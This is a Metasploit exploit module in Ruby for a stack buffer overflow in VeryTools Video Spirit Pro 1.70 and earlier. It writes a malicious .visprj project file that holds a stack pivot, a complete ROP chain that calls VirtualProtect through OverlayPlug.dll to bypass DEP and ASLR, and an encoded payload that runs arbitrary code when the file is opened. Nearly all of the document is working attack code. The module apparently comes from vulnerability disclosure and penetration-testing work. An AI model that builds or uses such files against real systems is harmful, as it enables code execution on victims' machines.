# $Id: videospirit_visprj.rb 12305 2011-04-11 23:32:41Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;VeryTools Video Spirit Pro <= 1.70&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in Video Spirit <= 1.70.
                When opening a malicious project file (.visprj), a stack buffer overflow occurs,
                resulting in arbitrary code execution.
                This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Acidgen&#039;,      #found the vulnerability
                    &#039;corelanc0d3r&#039;, #rop exploit + msf module
                ],
            &#039;Version&#039;        => &#039;$Revision: 12305 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.corelan.be/advisories.php?id=CORELAN-11-001&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;        => 800,  #0x320 bytes - avoid marking wrong page as RWX
                    &#039;BadChars&#039;     => "\x00\x0a\x0b\x0c\x0d\x0e\x0f\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x26\x27\x2f\x3c\x3e",
                    &#039;DisableNops&#039;  => &#039;True&#039;,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;  =>
                [
                    [ &#039;Windows XP/Vista/Win7/... Generic DEP & ASLR Bypass&#039;,
                        {
                            &#039;OffSet&#039;      => 168,
                            &#039;OffSetToRop&#039; => 952,
                            &#039;Ret&#039;         => 0x1006CC10, #overlayplug.dll stackpivot bad char friendly
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Apr 11 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;VideoSpirit project name.&#039;,  &#039;msf.visprj&#039;]),
            ], self.class)
    end
 
    def junk
        return rand_text_alphanumeric(4).unpack("L")[0].to_i
    end
 
    def exploit
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        header = %Q|
<version value="1" />
<track>
<type value="0" />
<type value="4" />
<type value="2" />
<type value="1" />
<type value="7" />
</track>
<track0 />
<track1 />
<track2 />
<track3 />
<track4 />
<clip />
<type0 enable="1">
|
 
        footer = %Q|
<valitem name="320*240(4:3)" value="320*240" />
<valitem name="30" value="30" />
<valitem name="16000k" value="16000k" />
</type0>
<type1 enable="1">
<valitem name="mp3" value="libmp3lame" />
<valitem name="128k" value="128k" />
<valitem name="44100" value="44100" />
<valitem name="2 (Stereo)" value="2" />
</type1>
<type2 enable="0" />
</output>
|
        print_status("Preparing payload")
 
        pivot = [target.ret].pack(&#039;V&#039;)
 
        rop_gadgets =
        [
            # one non-ASLR module is enough for generic ASLR & DEP bypass !
            # pvefindaddr rop &#039;n roll
            # First, grab VirtualProtect ptr
            0x10065292,  # POP EAX # RETN      [OverlayPlug.dll]
            0x106F4244,  # IAT entry + offsqet (bad char friendly)
            0x10019762,  # POP EBP # RETN      [OverlayPlug.dll]
            0xEFEFEFF0,  # bye bye offset
            0x10084977,  # ADD EBP,EAX # RETN  [OverlayPlug.dll]
            0x100684B8,  # MOV EAX,EBP # POP ESI # POP EBP # POP EBX # RETN  [OverlayPlug.dll]
            junk,
            junk,
            junk,
            0x1005E114,  # MOV EAX,DWORD PTR DS:[EAX] # RETN  [OverlayPlug.dll]
            0x10016A56,  # XCHG EAX,ESI         [OverlayPlug.dll]
 
            # set size
            0x100A9274,  # POP EAX # RETN       [OverlayPlug.dll]
            0x10101330,  # 0x320 bytes - change this if needed, but don&#039;t make it too big :)
            0x10019762,  # POP EBP # RETN       [OverlayPlug.dll]
            0xEFEFEFF0,  # boo
            0x10084977,  # ADD EBP,EAX # RETN   [OverlayPlug.dll]
            0x10053E4C,  # XCHG EAX,EBP # RETN  [OverlayPlug.dll]
            0x10066D8C,  # PUSH EAX # ADD AL,5D # POP EBX # MOV DWORD PTR FS:[0],ECX # ADD ESP,50 # RETN 10  [OverlayPlug.dll]
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
            junk,
 
            # set NewProtect to 0x40
            0x100E3D4A,  # XOR EAX,EAX # XOR EDX,EDX # RETN  [OverlayPlug.dll]
            junk,
            junk,
            junk,
            junk,
            0x10010C36,  # ADD EAX,10 # POP EBP # RETN 4  [OverlayPlug.dll]
            junk,
            0x10010C36,  # ADD EAX,10 # POP EBP # RETN 4  [OverlayPlug.dll]
            junk,
            junk,
            0x10010C36,  # ADD EAX,10 # POP EBP # RETN 4  [OverlayPlug.dll]
            junk,
            junk,
            0x10010C36,  # ADD EAX,10 # POP EBP # RETN 4  [OverlayPlug.dll]
            junk,
            junk,
            0x10030C8B,  # ADD DL,AL # ADD AL,0 # MOV EAX,EDX # RETN 4  [OverlayPlug.dll]
            junk,
 
            # write pOldProtect to .data section
            0x1001AB51,  # POP ECX # RETN  [OverlayPlug.dll]
            junk,
            0x10117030,  # RW
 
            # EDI : ROP NOP
            0x10057090,  # POP EDI # RETN  [OverlayPlug.dll]
            0x10057091,  # ROP NOP
 
            # pReturn2Payload
            0x100BC8E8,  # PUSH ESP # MOV EAX,ESI # POP ESI # RETN  [OverlayPlug.dll]
            0x10016A56,  # XCHG EAX,ESI # RETN  [OverlayPlug.dll]
            0x1003C946,  # ADD EAX,0A # RETN    [OverlayPlug.dll]
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1003C946,
            0x1001FDBD,  # XCHG EAX,EBP # RETN  [OverlayPlug.dll]
 
            0x100A9274,  # POP EAX # RETN       [OverlayPlug.dll]
            0x41414141,
 
            # go
            0x10066F84,  # PUSHAD # RETN        [OverlayPlug.dll]
        ].pack("V*")
 
 
        buffer = "<valitem name="
        buffer << &#039;"&#039;
        buffer << rand_text_alphanumeric((target[&#039;OffSet&#039;]))
        buffer << rand_text_alphanumeric(4) #nseh
        buffer << pivot
        buffer << rand_text_alphanumeric((target[&#039;OffSetToRop&#039;]))
        buffer << "\x91\x70\x05\x10" * 10   #rop nop, offset Win7
        buffer << rop_gadgets
        buffer << make_nops(150)
        buffer << payload.encoded
        buffer << rand_text_alphanumeric(4000)
        buffer << &#039;"&#039;
        buffer << &#039; value="msmpeg4v2"&#039;
        buffer << "/>"
        buffer << "\n"
 
        filecontent = header + buffer + footer
 
        print_status("Writing payload to file")
 
        file_create(filecontent)
 
    end
 
end



